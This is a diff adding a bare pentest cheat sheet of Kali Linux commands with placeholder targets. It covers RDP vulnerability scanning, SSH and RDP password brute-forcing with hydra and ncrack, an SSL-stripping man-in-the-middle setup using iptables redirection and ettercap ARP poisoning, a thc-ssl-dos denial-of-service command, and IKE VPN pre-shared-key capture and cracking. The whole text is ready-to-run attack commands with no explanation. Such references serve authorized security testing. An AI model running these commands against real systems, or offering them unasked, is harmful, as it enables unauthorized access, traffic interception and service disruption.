@@ -1,0 +1,27 @@
+root@kali:~# nmap - p 3389 --script rdp-enum-encryption <IP>  
+root@kali:~# nmap -sV -p 3389 --script rdp-vuln-ms12-020 < IP>
+root@kali:~# ncrack -vv -U user.lst -P password.list <Target IP>:<Target Port> 
+root@kali:~# hydra -s 22 -v -V -L <file path/name> -P <file path/name> -t 8 <Target IP><protocol>  
+root@kali:~# hydra -L user.lst -V -x 6:8:aA1 <IP address>SSH
+root@kali:~# hydra -L user.lst -V -x '6:8:aA1!@#$' <IP address> SSH  
+vncviewer <Target IP> 
+testssl.sh
+root@kali:~# nmap --script <script name> -p 443 <Target IP>  
+root@kali:~# nmap --script "ssl*" <IP address>
+sslscan --no-failed target.com
+sslyze -regular target.com
+tlssled target.com port
+sslstrip
+root@kali:~# echo "1"> /proc/sys/net/ipv4/ip_forward
+root@kali:~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <listenport> 
+root@kali:~# sslstrip -l 5353
+root@kali:~# ettercap -TqMarp:remote /192.168.75.128/ /192.168.75.2/
+root@kali:~# thc-ssl-dos <IP address><port> 
+root@kali@:~# nmap -sU -Pn -p 500 <IP Address>
+root@kali@:~# ike-scan -M <Target IP>
+ike-scan -M --showbackoff targetIP
+root@kali@:~# ike-scan --pskcrack --aggressive --id=peer <target>
+root@kali@:~# ike-scan -M -A -Ppsk-hash -d <target>
+psk-crack -d wordlist psk-hash
+
+
